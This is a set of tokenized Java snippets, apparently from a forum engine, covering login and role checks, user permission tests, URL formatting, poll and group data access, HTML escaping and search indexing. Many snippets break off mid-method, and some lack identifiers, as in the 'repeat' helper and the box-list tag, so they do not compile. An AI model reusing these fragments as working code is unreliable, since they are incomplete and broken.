public void performLogin ( HttpServletResponse response , User user ) { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; session . setAttribute ( " moderator " , user . isModerator ( ) ) ; session . setAttribute ( " corrector " , user . canCorrect ( ) ) ; userDao . updateLastlogin ( user ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } return ! isModerator ( ) ; 
public void maxcomTest ( ) throws Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) throws Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user5starTest ( ) throws Exception { ResultSet resultSet = Users . getUser5star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) throws Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; try { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } try { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; try { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public String formatJump ( MessageDao messageDao , boolean secure ) throws MessageNotFoundException , URIException { if ( isMessageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = null ; try { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { throw new RuntimeException ( " Invalid group id msgid= " + messageId , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( isCommentUrl ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public String format ( String text , boolean secure ) { String escapedText = StringUtil . escapeHtml ( text ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , true ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String token = st . nextToken ( ) ; String formattedToken = formatURL ( token , secure ) ; sb . append ( formattedToken ) ; } return sb . toString ( ) ; } 
private void processMessageUrl ( boolean secure , StringBuilder out , LorURI uri ) throws URIException { try { Message message = messageDao . getById ( uri . getMessageId ( ) ) ; 
public boolean isTrueLorUrl ( ) { return trueLorUrl ; } 
public boolean isMessageUrl ( ) { return messageUrl ; } 
public boolean isCommentUrl ( ) { return commentUrl ; } 
public String formatUrlBody ( int maxLength ) throws URIException { String all = lorURI . getURIReference ( ) ; String scheme = lorURI . getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( trueLorUrl ) { if ( uriWithoutScheme . length ( ) < maxLength ) { 
public String fixScheme ( boolean secure ) throws URIException { if ( ! trueLorUrl ) { return toString ( ) ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
public String formatJump ( MessageDao messageDao , boolean secure ) throws MessageNotFoundException , URIException { if ( messageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = null ; try { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { throw new RuntimeException ( " Invalid group id msgid= " + messageId , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( commentUrl ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public PreparedPoll preparePoll ( Poll poll ) { return new PreparedPoll ( poll , 
public PreparedPoll preparePoll ( Message topic ) throws PollNotFoundException { Poll poll = pollDao . getPollByTopicId ( topic . getId ( ) ) ; return new PreparedPoll ( poll , 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) throws Exception { Message message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " highlight " , required = false ) Set < Integer > highlight ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) throws Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public void deletePoll ( Poll poll ) { jdbcTemplate . update ( " DELETE FROM vote_users WHERE vote = ? " , poll . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM votenames WHERE id = ? " , poll . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM votes WHERE vote = ? " , poll . getId ( ) ) ; } 
public void voteGetCurrentPollTest ( ) throws Exception { int currentPollId = pollDao . getCurrentPollId ( ) ; Poll poll = pollDao . getCurrentPoll ( ) ; Assert . assertEquals ( currentPollId , poll . getId ( ) ) ; 
public void voteCreateAndRunningPollTest ( ) throws Exception { List < String > pollList = new ArrayList < String > ( ) ; pollList . add ( " Case 1 " ) ; pollList . add ( " Case 2 " ) ; pollList . add ( " Case 3 " ) ; try { pollDao . createPoll ( pollList , true , TEST_TOPIC_ID ) ; 
public List < GalleryItem > get ( ) { return galleryDao . getGalleryItems ( COUNT_ITEMS ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) throws SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " title " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; try { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public ScreenShot moveTo ( String dir , String name ) throws IOException { ScreenShot dest = new ScreenShot ( name , dir , extension ) ; FileUtils . moveFile ( mainFile , dest . mainFile ) ; FileUtils . moveFile ( iconFile , dest . iconFile ) ; FileUtils . moveFile ( mediumFile , dest . mediumFile ) ; return dest ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } return ! canmod ; 
public int doStartTag ( ) throws JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } List < String > boxnames = . getProf ( ) . getList ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public void init ( ) { try { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , true , " UTF-8 " ) ; } catch ( Exception e ) { throw new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { throw new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } try { mainHost = mainURI . getHost ( ) ; 
public TrackerItem mapRow ( ResultSet resultSet , int i ) throws SQLException { User author ; User lastCommentBy ; int msgid ; int cid ; int pages ; Timestamp lastmod ; Timestamp postdate ; int stat1 ; int stat3 ; int stat4 ; int groupId ; int section ; String groupTitle ; String groupUrlName ; String title ; boolean resolved ; boolean uncommited ; try { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; title = resultSet . getString ( " title " ) ; cid = resultSet . getInt ( " cid " ) ; try { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , title , cid , lastCommentBy , resolved , 
public static String repeat ( String s , int ) { if ( s = = null ) { return null ; } if ( < = 0 ) { return s ; } final StringBuilder sb = new StringBuilder ( s . length ( ) * ) ; for ( int i = 0 ; i < ; i + + ) { sb . append ( s ) ; } return sb . toString ( ) ; } 
Set < String > getAllowedListParameters ( ) ; Set < String > getBlockLevelTags ( ) ; Map < String , Tag > getAllTagsDict ( ) ; Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getBlockLevelTags ( ) ; Map < String , Tag > getAllTagsDict ( ) ; Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Map < String , Tag > getAllTagsDict ( ) ; Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
private static String fixNL ( String text ) { return text . replaceAll ( NL_REGEXP , " [br] " ) ; } 
public static String escapeForceHtml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : res . append ( " &amp; " ) ; break ; default : res . append ( str . charAt ( i ) ) ; } } return res . toString ( ) ; } 
private void rawPushTextNode ( RootNode rootNode , Node currentNode , String text , boolean isCode ) { if ( ! isCode ) { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , parserParameters , text , rootNode ) ) ; 
public String renderXHtml ( ) { return StringUtil . escapeForceHtml ( text ) ; } 
public void inCodeEscape ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&amp;#9618;</code></pre></div> " , lorCodeService . parseTopic ( " [code]&#9618;[/code] " , false ) ) ; assertEquals ( " <p>&#9618;</p> " , 
public RepliesListItem mapRow ( ResultSet resultSet , int i ) throws SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; User cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { try { cAuthor = userDao . getUserCached ( resultSet . getInt ( " cAuthor " ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = null ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; String sectionTitle = resultSet . getString ( " name " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; RepliesListItem . EventType type = RepliesListItem . EventType . valueOf ( resultSet . getString ( " type " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; String messageText ; if ( readMessage ) { messageText = commentDao . getPreparedCommentRSS ( cid , secure ) ; } else { messageText = null ; } return new RepliesListItem ( cid , cAuthor , cDate , messageText , groupTitle , groupUrlName , sectionTitle , sectionId , subj , lastmod , msgid , type , eventMessage , eventDate ) ; 
public RepliesListItem mapRow ( ResultSet resultSet , int i ) throws SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; User cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { try { cAuthor = userDao . getUserCached ( resultSet . getInt ( " cAuthor " ) ) ; } catch ( UserNotFoundException e ) { throw new RuntimeException ( e ) ; } cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = null ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; String sectionTitle = resultSet . getString ( " name " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; RepliesListItem . EventType type = RepliesListItem . EventType . valueOf ( resultSet . getString ( " type " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; String messageText ; if ( readMessage ) { messageText = lorCodeService . prepareTextRSS ( resultSet . getString ( " cMessage " ) , secure , resultSet . getBoolean ( " bbcode " ) ) ; } else { messageText = null ; } return new RepliesListItem ( cid , cAuthor , cDate , messageText , groupTitle , groupUrlName , sectionTitle , sectionId , subj , lastmod , msgid , type , eventMessage , eventDate ) ; 
public String prepareTextRSS ( String text , boolean secure , boolean lorcode ) { if ( lorcode ) { return parseCommentRSS ( text , secure ) ; 
public Group mapRow ( ResultSet resultSet , int i ) throws SQLException { return new Group ( resultSet ) ; } 
public Group mapRow ( ResultSet rs , int rowNum ) throws SQLException { return new Group ( rs ) ; } 
public int calcTopicsCount ( Group group , boolean showDeleted ) { String query = " SELECT count(topics.id) " + " FROM topics WHERE " + ( group . isModerated ( ) ? " moderate AND " : " " ) + " groupid=? " ; if ( ! showDeleted ) { query + = " AND NOT topics.deleted " ; } List < Integer > res = jdbcTemplate . queryForList ( query , Integer . class , group . getId ( ) ) ; if ( ! res . isEmpty ( ) ) { return res . get ( 0 ) ; 
public String doInPreparedStatement ( PreparedStatement pst ) throws SQLException , DataAccessException { pst . setString ( 1 , title ) ; if ( info . length ( ) > 0 ) { pst . setString ( 2 , info ) ; } else { pst . setString ( 2 , null ) ; } if ( longInfo . length ( ) > 0 ) { pst . setString ( 3 , longInfo ) ; } else { pst . setString ( 3 , null ) ; } pst . setBoolean ( 4 , resolvable ) ; pst . setString ( 5 , urlName ) ; pst . setInt ( 6 , group . getId ( ) ) ; pst . executeUpdate ( ) ; return null ; } 
public Group getGroup ( Message message ) throws BadGroupException { return groupDao . getGroup ( message . getGroupId ( ) ) ; } 
public void groupsTest ( ) throws Exception { Section sectionDto = mock ( Section . class ) ; when ( sectionDto . getId ( ) ) . thenReturn ( Section . SECTION_FORUM ) ; List < Group > groupDtoList = groupDao . getGroups ( sectionDto ) ; Assert . assertEquals ( 16 , groupDtoList . size ( ) ) ; Group groupDto = groupDao . getGroup ( sectionDto , " general " ) ; Assert . assertTrue ( " General " . equals ( groupDto . getTitle ( ) ) ) ; } 
public Topic get ( ) throws MessageNotFoundException { return messageDao . getById ( poll . getTopicId ( ) ) ; } 
public PreparedPoll preparePoll ( Topic topic ) throws PollNotFoundException { Poll poll = pollDao . getPollByTopicId ( topic . getId ( ) ) ; return new PreparedPoll ( poll , 
private void reindexMessage ( int msgid , boolean withComments ) throws IOException , SolrServerException , MessageNotFoundException { Topic msg = messageDao . getById ( msgid ) ; if ( ! msg . isDeleted ( ) ) { updateMessage ( msg ) ; } else { logger.info("Deleting message "+msgid+" from solr"); solrServer.deleteById((Integer.toString(msg.getId()))); } if (withComments) { CommentList commentList = commentDao.getCommentList(msg, true); 
private void updateMessage ( Topic topic ) throws IOException , SolrServerException { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , topic . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , topic . getMessageId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( topic . getTitle ( ) ) ) ; doc . addField ( " topic_title " , topic . getTitle ( ) ) ; doc . addField ( " message " , topic . getMessage ( ) ) ; Date postdate = topic . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , false ) ; solrServer . add ( doc ) ; } 
private static SolrInputDocument processComment ( Topic topic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , topic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " topic_user_id " , topic . getUid ( ) ) ; doc . addField ( " topic_id " , comment . getTopicId ( ) ) ; doc . addField ( " group_id " , topic . getGroupId ( ) ) ; String topicTitle = topic . getTitle ( ) ; doc . addField ( " topic_title " , StringEscapeUtils . unescapeHtml ( topicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( topicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " title " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , true ) ; return doc ; } 
public static EditInfoDTO createFromMessage ( TagDao tagDao , Topic message ) { EditInfoDTO current = new EditInfoDTO ( ) ; current . setOldmessage ( message . getMessage ( ) ) ; current . setEditdate ( message . getPostdate ( ) ) ; current . setEditor ( message . getUid ( ) ) ; current . setMsgid ( message . getMessageId ( ) ) ; current . setOldtags ( TagDao . toString ( tagDao . getMessageTags ( message . getMessageId ( ) ) ) ) ; current . setOldlinktext ( message . getLinktext ( ) ) ; current . setOldurl ( message . getUrl ( ) ) ; return current ; } 
public PreparedTopic prepareMessage ( Topic message , boolean minimizeCut , boolean secure ) { return prepareMessage ( message , messageDao . getTags ( message ) , minimizeCut , null , secure ) ; } 
public PreparedTopic prepareMessage ( Topic message , List < String > tags , PreparedPoll newPoll , boolean secure ) { return prepareMessage ( message , tags , false , newPoll , secure ) ; } 
private PreparedTopic prepareMessage ( Topic message , List < String > tags , boolean minimizeCut , PreparedPoll poll , boolean secure ) { try { Group group = groupDao . getGroup ( message . getGroupId ( ) ) ; 
public List < PreparedTopic > prepareMessagesFeed ( List < Topic > messages , boolean secure ) { List < PreparedTopic > pm = new ArrayList < PreparedTopic > ( messages . size ( ) ) ; for ( Topic message : messages ) { PreparedTopic preparedMessage = prepareMessage ( message , messageDao . getTags ( message ) , true , null , secure ) ; pm . add ( preparedMessage ) ; } return pm ; } 
